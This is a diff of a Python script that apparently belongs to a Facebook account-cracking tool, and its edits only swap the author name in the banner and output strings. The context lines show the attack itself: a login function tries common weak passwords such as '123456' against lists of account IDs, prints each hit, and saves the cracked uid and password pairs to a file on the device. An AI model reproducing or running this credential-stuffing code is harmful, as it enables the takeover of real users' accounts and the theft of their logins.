@@ -169,7 +169,7 @@ def ____banner____():
  („• ֊ •„)   Hello . . . 💌
  ━O━O━━━━━━━━━━━━━━━━━━━━━━━
 [Name]'s Intro! 🐇 💨 
-┊🌺 Name : Sanju Xwd
+┊🌺 Name : Abhiiu siingh
 ┊🌼 Age : 21
 ┊🌻 Pronouns/Gender : Male
 ┊🥕 Hobbies : Biran Hu
@@ -401,7 +401,7 @@ def login_1(uid):
     global loop
     session = requests.session()
     try:
-        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mSANJU OK ID-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mABHIIU OK ID-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
         sys.stdout.flush()
         for pw in ('123456', '1234567', '12345678', '123456789'):
             data = {
@@ -451,7 +451,7 @@ def login_1(uid):
                 oks.append(uid)
                 break
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mSANJU BABA\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mABHIIU SIINGH\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                 open('/sdcard/ABHIIU-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
